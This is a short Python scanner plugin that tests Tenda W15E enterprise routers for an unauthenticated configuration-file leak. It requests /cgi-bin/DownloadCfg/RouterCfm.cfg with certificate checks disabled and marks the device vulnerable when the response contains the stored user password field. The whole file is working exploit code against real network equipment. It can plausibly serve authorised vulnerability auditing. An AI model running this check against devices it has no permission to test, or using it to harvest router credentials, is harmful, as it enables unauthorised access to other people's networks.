#coding:utf-8
import requests
import requests.packages.urllib3
requests.packages.urllib3.disable_warnings()
import re
def msg():
  ret = {

      'links'     :  'https://mp.weixin.qq.com/s/w-cZU06p5VJb82bs2uoIeg',

      'huixian'   :  '',

      'method'    :   'get',

      'bugname'   :   'Tenda W15E企业级路由器 RouterCfm.cfg 配置文件泄漏漏洞',

      'level'     :   'high',

      'FOFA'      :   '',

      'author'    :   'ppxfx',

      'ifbug'     :   False,
  }
  return ret

def run(url,ua):
  ret = msg()
  headers = {'User-Agent': ua}
  target = '/cgi-bin/DownloadCfg/RouterCfm.cfg'
  url1 = url + target
  ret['url'] = url1
  try:
    res=requests.get(url=url1,headers=headers,timeout=5,verify=False)
    if res.status_code == 200 and re.search(r"sys.userpass=.*?wl2g.public.sta_timeout=",res.text,re.S):
      # print(res.text)
      # ret['huixian'] = res.text
      ret['ifbug'] = True
      res.close()
      return ret
    else:
      return ret
  except:
    return ret